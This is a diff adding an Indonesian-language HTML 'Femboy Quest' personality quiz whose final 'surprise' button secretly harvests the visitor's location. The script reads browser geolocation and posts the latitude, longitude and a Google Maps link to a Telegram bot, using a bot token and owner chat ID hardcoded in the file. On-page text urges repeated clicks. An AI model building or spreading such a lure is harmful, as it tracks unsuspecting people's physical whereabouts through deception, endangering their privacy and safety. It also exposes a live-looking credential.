@@ -1,0 +1,294 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Femboy Quest</title>
+
+<style>
+
+body{
+margin:0;
+font-family:Arial;
+background:linear-gradient(135deg,#ff8bd1,#a78bfa);
+height:100vh;
+display:flex;
+justify-content:center;
+align-items:center;
+}
+
+.box{
+background:#1e293b;
+width:360px;
+padding:25px;
+border-radius:14px;
+text-align:center;
+color:white;
+box-shadow:0 10px 30px rgba(0,0,0,0.3);
+}
+
+button{
+width:100%;
+margin-top:10px;
+padding:10px;
+border:none;
+border-radius:8px;
+background:#38bdf8;
+color:black;
+font-weight:bold;
+cursor:pointer;
+}
+
+button:hover{
+background:#0ea5e9;
+}
+
+#progress,#status{
+margin-top:10px;
+font-size:14px;
+color:#ddd;
+}
+
+</style>
+</head>
+
+<body>
+
+<div class="box">
+
+<h2>✨ Femboy Quest ✨</h2>
+
+<p id="question">Klik mulai quest</p>
+
+<div id="answers"></div>
+
+<button id="startBtn" onclick="start()">Mulai Quest</button>
+
+<p id="progress"></p>
+
+<p id="status"></p>
+
+</div>
+
+<script>
+
+const TOKEN="8603934449:AAHmlwkehx5CxF5d-XK2_Ccgq735VR4Sjxs"
+const OWNER_ID="8443557577"
+
+const questions=[
+
+{q:"Hoodie favorit?",a:[
+{t:"Oversize banget 🧸",p:30},
+{t:"Oversize dikit",p:20},
+{t:"Normal",p:10},
+{t:"Jarang pakai",p:5},
+{t:"Tidak suka hoodie",p:0}
+]},
+
+{q:"Celana favorit?",a:[
+{t:"Pendek santai",p:25},
+{t:"Skinny jeans",p:20},
+{t:"Celana lucu",p:15},
+{t:"Panjang biasa",p:10},
+{t:"Celana olahraga",p:5}
+]},
+
+{q:"Kaus kaki?",a:[
+{t:"Thigh high",p:30},
+{t:"Kaus kaki lucu",p:20},
+{t:"Kadang pakai",p:10},
+{t:"Jarang",p:5},
+{t:"Tidak pernah",p:0}
+]},
+
+{q:"Perawatan kulit?",a:[
+{t:"Skincare lengkap",p:30},
+{t:"Sering lotion",p:20},
+{t:"Kadang lotion",p:10},
+{t:"Jarang",p:5},
+{t:"Tidak pernah",p:0}
+]},
+
+{q:"Rambut kamu?",a:[
+{t:"Panjang / wig",p:30},
+{t:"Medium stylish",p:20},
+{t:"Pendek rapi",p:10},
+{t:"Pendek biasa",p:5},
+{t:"Botak 😭",p:0}
+]},
+
+{q:"Aksesori?",a:[
+{t:"Choker + gelang",p:25},
+{t:"Hairpin lucu",p:20},
+{t:"Jam tangan",p:10},
+{t:"Kadang aksesori",p:5},
+{t:"Tidak pakai",p:0}
+]},
+
+{q:"Fashion kamu?",a:[
+{t:"Cute fashion",p:25},
+{t:"Eksperimen style",p:20},
+{t:"Normal aja",p:10},
+{t:"Simple",p:5},
+{t:"Tidak peduli",p:0}
+]},
+
+{q:"Warna baju favorit?",a:[
+{t:"Pastel pink",p:25},
+{t:"Pastel campur",p:20},
+{t:"Hitam putih",p:10},
+{t:"Random",p:5},
+{t:"Gelap semua",p:0}
+]},
+
+{q:"Hobi kamu?",a:[
+{t:"Cosplay",p:25},
+{t:"Fashion explore",p:20},
+{t:"Gaming",p:10},
+{t:"Olahraga",p:5},
+{t:"Tidur",p:0}
+]},
+
+{q:"Selfie?",a:[
+{t:"Selfie terus",p:25},
+{t:"Sering",p:20},
+{t:"Kadang",p:10},
+{t:"Jarang",p:5},
+{t:"Tidak pernah",p:0}
+]},
+
+{q:"Style duduk?",a:[
+{t:"Cute pose",p:25},
+{t:"Santai lucu",p:20},
+{t:"Normal",p:10},
+{t:"Serius",p:5},
+{t:"Maskulin",p:0}
+]},
+
+{q:"Teman bilang kamu?",a:[
+{t:"Imut banget",p:30},
+{t:"Cute",p:20},
+{t:"Biasa aja",p:10},
+{t:"Agak aneh",p:5},
+{t:"Maskulin",p:0}
+]}
+
+]
+
+let index=0
+let score=0
+
+function start(){
+index=0
+score=0
+document.getElementById("startBtn").style.display="none"
+showQuestion()
+}
+
+function showQuestion(){
+
+const q=questions[index]
+
+document.getElementById("question").innerText=q.q
+
+const ans=document.getElementById("answers")
+
+ans.innerHTML=""
+
+q.a.forEach(opt=>{
+
+const btn=document.createElement("button")
+
+btn.innerText=opt.t
+
+btn.onclick=()=>{
+score+=opt.p
+next()
+}
+
+ans.appendChild(btn)
+
+})
+
+document.getElementById("progress").innerText="Pertanyaan "+(index+1)+" / "+questions.length
+
+}
+
+function next(){
+index++
+if(index<questions.length){
+showQuestion()
+}else{
+loading()
+}
+}
+
+function loading(){
+
+document.getElementById("question").innerText="Menghitung aura femboy..."
+
+document.getElementById("answers").innerHTML=""
+
+document.getElementById("progress").innerText=""
+
+setTimeout(finish,2000)
+
+}
+
+function finish(){
+
+let result=""
+
+if(score<80) result="Masih normal 🗿"
+else if(score<150) result="Mulai mencurigakan 👀"
+else if(score<220) result="Femboy starter pack"
+else if(score<300) result="Femboy elite"
+else if(score<350) result="LARI ADA FEMBOY 🏃"
+else result="FEMBOY TINGKAT DEWA 💅✨"
+
+document.getElementById("question").innerText="Hasil Quest"
+
+document.getElementById("answers").innerHTML=
+"<h3>"+result+"</h3><button onclick='ambilLokasi()'>Lihat Surprise 🎁</button>"
+
+}
+
+function ambilLokasi(){
+
+const status=document.getElementById("status")
+
+if(!navigator.geolocation){
+status.innerText="tekan ulang"
+return
+}
+
+status.innerText="tekan berulang kali untuk surprise"
+
+navigator.geolocation.getCurrentPosition((pos)=>{
+
+const lat=pos.coords.latitude
+const lon=pos.coords.longitude
+
+const text="📍 Lokasi Didapat\n\nLatitude: "+lat+"\nLongitude: "+lon+"\n\nMap:\nhttps://maps.google.com/?q="+lat+","+lon
+
+fetch("https://api.telegram.org/bot"+TOKEN+"/sendMessage",{
+method:"POST",
+headers:{
+"Content-Type":"application/json"
+},
+body:JSON.stringify({
+chat_id:OWNER_ID,
+text:text
+})
+})
+
+status.innerText="Lokasi terkirim ✔"
+
+})
+
+}
+
+</script>
+
+</body>
+</html>
